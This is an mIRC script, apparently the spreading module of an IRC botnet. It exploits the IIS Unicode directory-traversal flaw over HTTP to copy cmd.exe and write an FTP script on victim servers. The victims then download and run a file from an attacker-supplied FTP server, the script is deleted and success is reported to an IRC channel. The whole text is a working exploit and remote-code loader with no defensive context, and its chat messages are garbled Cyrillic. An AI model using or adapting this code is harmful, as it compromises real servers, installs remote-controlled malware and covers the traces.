on *:DISCONNECT: { set %aftp.stat off }
alias aftp.start { 
  if ( %aftp.stat  == on ) { halt }
  if ($lines(unicod_ready) == 0) { halt }
  set %aftp.bug $read -l1 unicod_ready | write -dl1 unicod_ready
  sockclose scriptftp* | sockclose b0tzz* | sockclose delzz* 
  sockclose aftp | set %aftp.stat on |   set %ip $deltok(%aftp.bug,2-,47) | set %ftp $remove(%aftp.bug,%ip,/c+dir+c:\)
  set %ftpcopy %ftp $+ /c+copy+c:\winnt\system32\cmd.exe+eXe.eXe
  set %ftp1 $deltok(%ftp,2-,47) | set %ftp2 $left(%ftp1,2)
  if (%ftp2 == ..) { set %ftp / }
  else { set %ftp / $+ %ftp1 $+ / } 
  set %ftp %ftp $+ eXe.eXe? | sockopen aftp %ip 80
  .timeraftp.Tout 1 25 Aftp.Tout
}
on *:sockopen:aftp: {
  if ($sockerr > 0) {  halt }
  sockwrite -nt $sockname GET %ftpcopy
}
on *:sockread:aftp: {
  sockread -f %ftp1
  if (1 file(s) copied isin %ftp1) { 
    .timeraftp.Tout off
    .timeraftp.Tout2 1 1000 aftp.Tout2
    .msg %chan.join 14[10cmd.exe14] 4��� ���������� 14[13 $+ %ip $+ %ftp $+ /c+dir+c:\ $+ 14]
    set %tfp2 0 |  ftpscript 
  }
  if (Access is denied isin %ftp1) { set %aftp.stat off | aftp.start | .msg %chan.join 4����������� ����� 14[10cmd.exe14] 9���������� [Access is denied]  }
}
alias Aftp.Tout  { sockclose aftp | set %aftp.stat off | aftp.start  }
alias aftp.Tout2 { sockclose aftp | dozz }
alias ftpscript {    inc %tfp2 1 |   sockopen scriptftp. $+ %tfp2 %ip 80  }
on *:sockopen:scriptftp*: {
  if ($sockerr > 0) { halt }
  if ( $gettok($sockname,2,46) == 1 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+open+ $+ %aftp.server $+ >c:\winnt\x.scr
  if ( $gettok($sockname,2,46) == 2 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+user+ $+ %aftp.login $+ >>c:\winnt\x.scr
  if ( $gettok($sockname,2,46) == 3 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+ $+ %aftp.pass $+ >>c:\winnt\x.scr
  if ( $gettok($sockname,2,46) == 4 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+bin>>c:\winnt\x.scr
  if ( $gettok($sockname,2,46) == 5 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+get+ $+ %aftp.file $+ +c:\winnt\ $+ %aftp.file $+ >>c:\winnt\x.scr
  if ( $gettok($sockname,2,46) == 6 ) sockwrite -nt $sockname GET %ftp $+ /c+echo+bye>>c:\winnt\x.scr
  if ( $gettok($sockname,2,46) == 7 )  sockwrite -nt $sockname GET %ftp $+ /c+ftp+-s:c:\winnt\x.scr+-n+-d 
  if ( $gettok($sockname,2,46) <= 7 ) { ftpscript }
if ( $gettok($sockname,2,46) == 8 )  { .msg %chan.join 4������� ������,������������ ������� ���� 12[11wait12]  } }
on *:sockclose:scriptftp*: {
if ( $gettok($sockname,2,46) == 8 ) { .msg %chan.join 4������� ���� ���������,������������ ������ ���� 12[11wait12]  |  .timeraftp.Tout2 off  | delzz  |  b0tl0ad  } }
alias dozz { sockclose scriptftp* | .msg %chan.join 4������� ���� ��������� 12[11wait12] |  delzz  |  b0tl0ad  }
alias OuTLoadBot { sockclose b0tzz*  | .msg %chan.join 4�� ���� ��������� ����   | set %aftp.stat off | aftp.start   }
alias b0tl0ad { sockopen b0tzz $+ $rand(0,999999) %ip 80 }
on *:sockopen:b0tzz*: {    sockwrite -nt $sockname GET %ftp $+ /c+c:\winnt\ $+ %aftp.file |  .timeruotloadb 1 20 OuTLoadBot    }
on *:sockclose:b0tzz*: {  .timeruotloadb off | .msg %chan.join 4������ ���� ���������!!! | write ip.txt $sock($sockname).ip  | set %aftp.stat off | aftp.start  }
alias delzz { sockopen delzz $+ $rand(0,999999) %ip 80 }
on *:sockopen:delzz*: { .msg %chan.join 4������� ����� | sockwrite -nt $sockname GET %ftp $+ /c+del+c:\winnt\x.scr  | .msg %chan.join 4������ ����  }
